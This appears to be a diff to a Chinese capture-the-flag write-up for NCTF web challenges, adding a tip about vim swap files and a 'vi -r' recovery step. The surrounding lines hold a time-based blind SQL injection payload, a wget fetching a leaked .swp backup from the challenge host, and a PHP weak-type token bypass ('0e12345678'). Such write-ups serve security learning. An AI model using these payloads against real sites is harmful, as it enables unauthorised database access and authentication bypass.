@@ -861,7 +861,7 @@ user=admin' and if(mid(pw,1,1)>'9',sleep(2),1)#&pass=blabla
 >
 > TIPS:
 > 1.管理员邮箱观察一下就可以找到
-> 2.linux下一般使用vi编辑器，并且异常退出会留下备份文件
+> 2.linux下一般使用vi编辑器，并且异常退出会留下备份文件。(用vim编辑则不会)
 > 3.弱类型bypass
 
 *nctf{thanks_to_cumt_bxs}*
@@ -870,7 +870,7 @@ user=admin' and if(mid(pw,1,1)>'9',sleep(2),1)#&pass=blabla
 
 2、`wget http://nctf.nuptzj.cn/web14/.submit.php.swp` ；
 
-3、
+3、`vi -r .submit.php.swp` 
 
 ```php
 if(!empty($token)&&!empty($emailAddress)){
@@ -889,6 +889,7 @@ if(!empty($token)&&!empty($emailAddress)){
 ```
 
 要求token长度为10且`token!='0'`为假，可利用弱类型（含有数字内容的字符串也会被转换类型，所以`'0e123'=='0'`值为真）绕过，访问 *http://nctf.nuptzj.cn/web14/submit.php?emailAddress=admin%40nuptzj.cn&token=0e12345678*  即可。 
+
 
 ### MISC
 
